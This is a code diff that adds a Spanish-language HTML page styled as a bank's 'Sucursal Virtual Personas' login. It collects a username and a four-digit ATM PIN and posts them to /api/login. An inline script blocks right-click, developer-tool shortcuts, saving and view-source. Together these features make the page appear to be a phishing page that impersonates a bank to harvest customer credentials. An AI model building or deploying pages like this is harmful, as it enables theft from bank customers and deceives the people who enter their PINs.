@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo-placeholder">
+                <img src="Loguito.png" alt="Logo" class="logo"> 
+            </div>
+            <h1>Sucursal Virtual Personas</h1>
+        </header>
+
+        <main class="login-box">
+            <form id="loginForm" action="/api/login" method="POST"> 
+                <center><h2>¡Hola!</h2></center>
+                <center><p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p></center>
+
+                <div class="input-group">
+                    <i class="fas fa-user icon"></i>
+                    <input type="text" 
+                           id="usuario" 
+                           name="usuario" 
+                           placeholder="Usuario" 
+                           required
+                           maxlength="20"
+                           pattern="[A-Za-z0-9]+" 
+                           oninput="this.value = this.value.replace(/[^A-Za-z0-9]/g, '');" 
+                           title="Solo letras y números">
+                </div>
+                <a href="#" class="link-help"><u>¿Olvidaste tu usuario?</u></a>
+
+                <div class="input-group">
+                    <i class="fas fa-lock icon"></i>
+                    <input type="password" 
+                           id="claveCajero" 
+                           name="clave" 
+                           placeholder="Clave del cajero" 
+                           required
+                           maxlength="4"
+                           pattern="[0-9]{4}"
+                           title="Solo números">
+                </div>
+                <a href="#" class="link-help"><u>¿Olvidaste o bloqueaste tu clave?</u></a>
+
+                <button type="submit" id="btnIngresar" class="btn-primary btn-disabled" disabled>Iniciar sesión</button>
+            </form>
+
+            <a href="#" class="link-create">Crear usuario</a>
+        </main>
+    </div>
+
+    <script src="script.js"></script>
+<script>
+  // Bloquear clic derecho (botón derecho del mouse)
+  document.addEventListener("contextmenu", function(e) {
+    e.preventDefault();
+  });
+
+  // Bloquear combinaciones de teclas peligrosas
+  document.onkeydown = function(e) {
+    const key = e.keyCode || e.which;
+
+    if (
+      key === 123 || // F12
+      (e.ctrlKey && e.shiftKey && key === 73) || // Ctrl+Shift+I
+      (e.ctrlKey && e.shiftKey && key === 74) || // Ctrl+Shift+J
+      (e.ctrlKey && key === 83) || // Ctrl+S
+      (e.ctrlKey && key === 85) // Ctrl+U
+    ) {
+      e.preventDefault();
+      return false;
+    }
+  };
+</script>
+</body>
+</html>
